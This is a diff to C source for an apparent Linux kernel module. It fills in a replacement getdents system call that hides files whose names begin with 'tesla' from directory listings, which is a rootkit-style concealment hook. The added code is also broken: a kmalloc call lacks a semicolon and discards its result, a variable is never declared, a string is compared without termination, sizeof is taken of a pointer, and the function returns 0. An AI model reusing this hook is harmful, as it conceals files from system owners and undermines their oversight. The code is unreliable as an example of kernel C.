@@ -21,13 +21,28 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 {
 	//call getdents and use the information to filter out tesla files
 	
-	//step 1: total_size = orig_getdents( 3 ,dirp, ?)
-	//kmalloc(total_size, GFP_KERNEL)
+	int total_size = orig_getdents( 3 ,dirp, count);
+	kmalloc(total_size, GFP_KERNEL)
+
 	//step 2: copy_from_user(dirp_kernel, dirp, total_size) total_size depends on whether or not tesla file occurs first, remove if first, else hide
+	copy_from_user(dirp_kernel, dirp, total_size);
+
 	//step 3: merge dirp, hide/delete tesla files. file above size + tesla size. OR skip tesla file if on top
+	struct dirent first = dirp_kernel;
+	char name[5];
+	name[0] = dirp_kernel->d_name[0];
+	name[1] = dirp_kernel->d_name[1];
+	name[2] = dirp_kernel->d_name[2];
+	name[3] = dirp_kernel->d_name[3];
+	name[4] = dirp_kernel->d_name[4];	
+	int tesla = strcmp("tesla", name);
+	
+	if(tesla == 0){  //remove size of first entry from total_size
+		int removalSize = sizeof(dirp_kernel);
+		
+	}
+
 	//step 4: copy_to_user(dirp, dirp_kernel, total_size)
-	//
-	// 
     return 0;
 }
 
